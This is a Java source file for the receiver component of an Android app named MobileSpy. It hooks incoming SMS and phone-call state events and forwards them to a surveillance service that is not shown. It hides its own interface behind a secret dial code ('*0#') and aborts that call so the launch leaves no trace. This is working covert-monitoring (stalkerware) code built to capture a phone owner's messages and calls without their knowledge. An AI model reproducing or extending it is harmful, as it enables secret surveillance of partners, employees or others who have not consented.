package org.ddth.android.mobilespy;

import org.ddth.http.core.Logger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;

public class MobileSpyReceiver extends BroadcastReceiver {
	public static final String LOG_TAG = "MobileSpyService";
	
	private static final String ACTION_SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	private static final String ACTION_NEW_OUTGOING_SMS = "android.provider.Telephony.NEW_OUTGOING_SMS";
	private static final String SHOW_UI_REQUEST_NUMBER = "*0#";

	public void onReceive(Context context, Intent intent) {
		String action = intent.getAction();
		
		if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
			Intent.ACTION_USER_PRESENT.equals(action))
		{
			Logger.getDefault().debug("PHONE ACTIVATED");
		}
		else if (ACTION_SMS_RECEIVED.equals(action)) {
			Intent service = new Intent(context, MobileSpyService.class);
			service.putExtras(intent.getExtras());
			service.putExtra(MobileSpyService.EXTRA_EVENT_TYPE, MobileSpyService.EVENT_TYPE_SMS);
			context.startService(service);
		}
		else if (ACTION_NEW_OUTGOING_SMS.equals(action)) {
			// SDK doesn't support right now.
		}
		else if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(action)) {
			Bundle extras = intent.getExtras();
			String phoneState = extras.getString(TelephonyManager.EXTRA_STATE);
			if (TelephonyManager.EXTRA_STATE_IDLE.equals(phoneState)) {
				Intent service = new Intent(context, MobileSpyService.class);
				service.putExtra(MobileSpyService.EXTRA_EVENT_TYPE, MobileSpyService.EVENT_TYPE_CALL);
				context.startService(service);
			}
		}
		else if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
			Bundle extras = intent.getExtras();
			String outgoingNumber = extras.getString(Intent.EXTRA_PHONE_NUMBER);
			// Check for special code to start activity
			if (SHOW_UI_REQUEST_NUMBER.equals(outgoingNumber)) {
				Intent activity = new Intent(context, MobileSpyActivity.class);
				activity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(activity);
				// Abort the outgoing call
				setResultData(null);
			}
		}
	}
}
